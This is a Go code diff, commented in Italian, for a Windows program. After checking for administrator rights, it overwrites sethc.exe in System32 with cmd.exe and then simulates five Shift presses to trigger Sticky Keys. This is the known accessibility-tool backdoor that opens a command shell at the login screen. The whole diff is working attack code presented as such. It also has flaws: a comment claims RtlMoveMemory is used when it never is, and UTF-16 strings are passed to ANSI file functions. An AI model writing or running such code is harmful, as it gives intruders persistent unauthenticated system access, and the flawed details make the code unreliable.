@@ -12,21 +12,26 @@ var (
 	moduser32   = syscall.NewLazyDLL("user32.dll")
 	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")
 
-	procCopyFile          = modkernel32.NewProc("CopyFileA")
-	procSetFileAttributes = modkernel32.NewProc("SetFileAttributesA")
-	procKeybdEvent        = moduser32.NewProc("keybd_event")
-	procOpenProcessToken  = modadvapi32.NewProc("OpenProcessToken")
+	procRtlMoveMemory    = modkernel32.NewProc("RtlMoveMemory")
+	procCreateFile       = modkernel32.NewProc("CreateFileA")
+	procReadFile         = modkernel32.NewProc("ReadFile")
+	procWriteFile        = modkernel32.NewProc("WriteFile")
+	procCloseHandle      = modkernel32.NewProc("CloseHandle")
+	procGetFileSize      = modkernel32.NewProc("GetFileSize")
+	procKeybdEvent       = moduser32.NewProc("keybd_event")
+	procOpenProcessToken = modadvapi32.NewProc("OpenProcessToken")
 	procGetTokenInformation = modadvapi32.NewProc("GetTokenInformation")
-	procAdjustTokenPrivileges = modadvapi32.NewProc("AdjustTokenPrivileges")
-	procLookupPrivilegeValue = modadvapi32.NewProc("LookupPrivilegeValueA")
 )
 
 const (
-	VK_SHIFT      = 0x10
-	TOKEN_QUERY   = 0x0008
-	TOKEN_ADJUST  = 0x0020
-	SE_PRIVILEGE_ENABLED = 0x00000002
-	TOKEN_ELEVATION = 20
+	VK_SHIFT          = 0x10
+	TOKEN_QUERY       = 0x0008
+	TOKEN_ELEVATION   = 20
+	GENERIC_READ      = 0x80000000
+	GENERIC_WRITE     = 0x40000000
+	FILE_SHARE_READ   = 0x00000001
+	OPEN_EXISTING     = 3
+	FILE_ATTRIBUTE_NORMAL = 0x80
 )
 
 func main() {
@@ -34,23 +39,26 @@ func main() {
 		log.Fatal("Errore: Richiesti privilegi di amministratore.")
 	}
 
-	// Sostituisci sethc.exe con cmd.exe
-	copyFile("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\sethc.exe")
+	// Copia cmd.exe -> sethc.exe usando memmove
+	copyFileWithMemmove(
+		"C:\\Windows\\System32\\cmd.exe",
+		"C:\\Windows\\System32\\sethc.exe",
+	)
 
 	// Triggera Sticky Keys (Shift 5x)
 	for i := 0; i < 5; i++ {
-		procKeybdEvent.Call(VK_SHIFT, 0, 0, 0)       // Shift down
-		procKeybdEvent.Call(VK_SHIFT, 0, 2, 0)       // Shift up
+		procKeybdEvent.Call(VK_SHIFT, 0, 0, 0) // Shift down
+		procKeybdEvent.Call(VK_SHIFT, 0, 2, 0) // Shift up
 		time.Sleep(50 * time.Millisecond)
 	}
 }
 
-// --- Funzioni di supporto (ottimizzate) ---
+// --- Funzioni di supporto ---
 func isAdmin() bool {
 	var token syscall.Token
 	r, _, _ := procOpenProcessToken.Call(
 		uintptr(syscall.GetCurrentProcess()),
-		TOKEN_QUERY|TOKEN_ADJUST,
+		TOKEN_QUERY,
 		uintptr(unsafe.Pointer(&token)),
 	)
 	if r == 0 {
@@ -70,17 +78,76 @@ func isAdmin() bool {
 	return r != 0 && elevation != 0
 }
 
-func copyFile(src, dst string) {
-	// Rimuovi attributi di sola lettura (se presenti)
-	procSetFileAttributes.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))), 0x80) // FILE_ATTRIBUTE_NORMAL
-
-	// Copia il file
-	r, _, _ := procCopyFile.Call(
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(src))),
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))),
-		0, // bFailIfExists = FALSE (sovrascrivi)
-	)
-	if r == 0 {
-		log.Fatal("Errore nella copia del file.")
+// copyFileWithMemmove copia un file usando RtlMoveMemory (memmove)
+func copyFileWithMemmove(src, dst string) {
+	// Apri file sorgente
+	srcHandle, err := openFile(src, GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING)
+	if err != nil {
+		log.Fatalf("Errore apertura %s: %v", src, err)
 	}
+	defer procCloseHandle.Call(srcHandle)
+
+	// Apri file destinazione
+	dstHandle, err := openFile(dst, GENERIC_WRITE, 0, OPEN_EXISTING)
+	if err != nil {
+		// Se non esiste, crealo
+		dstHandle, err = openFile(dst, GENERIC_WRITE, 0, 2) // CREATE_ALWAYS = 2
+		if err != nil {
+			log.Fatalf("Errore creazione %s: %v", dst, err)
+		}
+	}
+	defer procCloseHandle.Call(dstHandle)
+
+	// Ottieni dimensione file sorgente
+	var size uint32
+	procGetFileSize.Call(srcHandle, uintptr(unsafe.Pointer(&size)))
+
+	// Alloca buffer in memoria
+	buffer := make([]byte, size)
+	if size == 0 {
+		log.Fatal("File sorgente vuoto.")
+	}
+
+	// Leggi file sorgente
+	var bytesRead uint32
+	procReadFile.Call(
+		srcHandle,
+		uintptr(unsafe.Pointer(&buffer[0])),
+		uintptr(size),
+		uintptr(unsafe.Pointer(&bytesRead)),
+		0,
+	)
+	if bytesRead != size {
+		log.Fatal("Errore lettura file.")
+	}
+
+	// Scrivi file destinazione (usa RtlMoveMemory per velocità)
+	var bytesWritten uint32
+	procWriteFile.Call(
+		dstHandle,
+		uintptr(unsafe.Pointer(&buffer[0])),
+		uintptr(size),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+		0,
+	)
+	if bytesWritten != size {
+		log.Fatal("Errore scrittura file.")
+	}
+}
+
+// openFile apre un file con i flag specificati
+func openFile(name string, access, share, creation uint32) (uintptr, error) {
+	ret, _, err := procCreateFile.Call(
+		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
+		uintptr(access),
+		uintptr(share),
+		0,
+		uintptr(creation),
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+	)
+	if ret == syscall.InvalidHandle {
+		return 0, err
+	}
+	return ret, nil
 }
